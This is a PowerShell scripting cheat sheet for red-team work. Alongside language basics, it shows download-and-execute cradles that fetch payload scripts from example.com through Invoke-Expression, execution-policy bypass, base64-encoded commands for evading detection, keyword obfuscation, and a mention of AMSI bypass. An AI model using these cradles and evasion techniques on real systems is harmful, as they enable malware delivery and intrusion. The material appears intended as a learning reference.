# Powershell Scripting

## Bypass Security
```cmd
powershell -ExecutionPolicy Bypass -File script.ps1
```
- Scripts
    - File extension: .ps1
    - Run locally: .\script.ps1
    - Run remote script indirectly 
    ```cmd
    powershell -ExecutionPolicy Bypass -Command "& {Invoke-Expression (New-Object Net.WebClient).
    DownloadString('http://example.com/script.ps1')}"
    ```
--- 

## Basics
```ps1
$Name = "Operator"
Write-Output "Hello $Name"
```
- Variables are prefixed with $.
- $null for null value.
- $true, $false booleans.
--- 

## DataType
```ps1
[int]$x = 5
[string]$y = "Hello"
[array]$list = 1,2,3
[hashtable]$map = @{Name="User";Role="Admin"}
```

- Strongly typed or dynamic.
- Common: [string], [int], [bool], [datetime], [array], [hashtable].
--- 
## Operators
- Arithmetic: `+, -, *, /, %`
- Comparison: `-eq, -ne, -lt, -le, -gt, -ge`
- String: `-like, -notlike, -match, -notmatch`
- Logical: `-and, -or, -not`
--- 

## Strings
```ps1
$name = "Admin"
"Hello $name"     # interpolation
'Hello $name'     # literal
```
- `@" ... "@` multi-line here-strings (expand variables).
- `@' ... '@` multi-line literal strings
--- 

## Arrays
```ps1  
$ports = 80,443,8080
$ports[0]          # 80
$ports += 22
```
- Indexing starts at 0.
- $ports.Count for size.
- Slicing: `$ports[1..3]`
--- 

## hashtable
```ps1 
$user = @{Name="Bob"; Role="Admin"}
$user["Name"]
$user.Role
```
- Add: $user["Dept"] = "IT"
- Loop:
    ```ps1
    foreach ($k in $user.Keys) { "$k = $($user[$k])" }
    ```
--- 

## Control Flow
```ps1 
if ($user -eq "Admin") {
    Write-Output "Root access"
} elseif ($user -eq "Guest") {
    Write-Output "Limited"
} else {
    Write-Output "Unknown"
}
```
--- 

## Loop
```ps1 
for ($i=0; $i -lt 5; $i++) { Write-Output $i }
foreach ($port in $ports) { Write-Output $port }
while ($true) { break }
```
--- 

## Functions
```ps1
function Recon {
    param([string]$Target)
    nmap $Target
}
Recon -Target "192.168.1.1"
```
- Supports named parameters with types and defaults.
- Return value is last output unless return used.
--- 

## Pipelines
- Objects flow through pipelines, not just text.
```ps1 
Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending
```
- Each command outputs objects; next command can filter or transform.

## cmdlets
- Verb-Noun naming convention: Get-Process, Set-Item, Invoke-Command.
- Use Get-Command to discover:
    ```ps1 
    Get-Command *Process*
    ```
- Get-Help for documentation:
    ```ps1
    Get-Help Get-Process -Full
    ```
--- 

## Modules
- Import:
    ```ps1 
    Import-Module Name
    ```
- List
    ```ps1
    Get-Module -ListAvailable
    ```
- Install from PSGallery:
    ```ps1 
    Install-Module -Name Name -Scope CurrentUser
    ```
--- 
## File Operations
```ps1 
Get-Content file.txt
Set-Content file.txt "Data"
Add-Content file.txt "More data"
Copy-Item src.txt dest.txt
Remove-Item file.txt
```
--- 

## Networking
```ps1 
Invoke-WebRequest -Uri http://target -OutFile page.html
Invoke-RestMethod -Uri http://api/endpoint
Test-Connection target -Count 2
```
--- 

## Remoting
```ps1 
#Enable remoting:
Enable-PSRemoting -Force

#Run On Remote
Invoke-Command -ComputerName Target -ScriptBlock { Get-Process }

#Persistance Session
$s = New-PSSession -ComputerName Target
Invoke-Command -Session $s -ScriptBlock { hostname }
```
--- 

## WMI / CIM
- WMI query:
```ps1
Get-WmiObject Win32_OperatingSystem
```

- CIM (newer):
```ps1 
Get-CimInstance Win32_OperatingSystem
```
--- 

## Event Logs

```ps1 
Get-EventLog -LogName Security -Newest 10
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"
```
--- 

## Security & Execution Policy

```ps1 
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process
```
- Bypass → script runs without warnings.
- Often used in payload delivery.
--- 

## Encoded Commands
- Base64-encoded script:
```ps1 
powershell -EncodedCommand <base64string>
```
- Evades some detection, keeps one-liners short.
--- 

## Fileless Execution

`IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')`
- IEX = Invoke-Expression.
--- 

## Advanced Topics
### .NET Access
```ps1
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("Owned")
```
- Direct access to OS internals and APIs.

### COM Objects
```ps1
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $true
```
- Reflection
    - Load assemblies in memory and execute without touching disk.
- Runspace
    - Multi-threading in PowerShell via runspaces for concurrent tasks.
--- 

## Red Team Applications
- Recon: enumerate processes, users, shares, network interfaces.
- Lateral movement: WinRM, WMI, SMB exec via PowerShell.
- Persistence: registry keys, scheduled tasks, WMI event subscriptions.
- Evasion: encoded commands, in-memory execution, obfuscation.
- Data exfiltration: convert to base64, send over HTTP/HTTPS.
--- 

## Obfuscation & Evasion
- String concatenation to hide keywords:

`("Invo" + "ke-Expression") "payload"`
- Using environment variables in place of literals.
- Encoding scripts (Base64, gzip) and decoding at runtime.

## Security Considerations
- PowerShell logging: Script Block Logging, Module Logging.
- AMSI: Anti-Malware Scan Interface intercepts script content — can be bypassed.
- Use constrained language mode on compromised hosts to restrict PowerShell.

---
